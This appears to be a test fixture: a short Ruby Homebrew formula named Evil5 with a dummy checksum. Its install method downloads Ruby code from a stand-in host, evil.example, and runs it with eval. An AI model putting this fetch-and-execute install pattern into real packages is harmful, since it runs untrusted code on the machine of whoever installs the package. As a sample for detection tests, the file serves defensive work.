require "open-uri"
class Evil5 < Formula
  url "https://example.com/evil5-1.0.tar.gz"
  sha256 "5555555555555555555555555555555555555555555555555555555555555555"
  def install
    eval(URI.open("https://evil.example/payload.rb").read)
  end
end
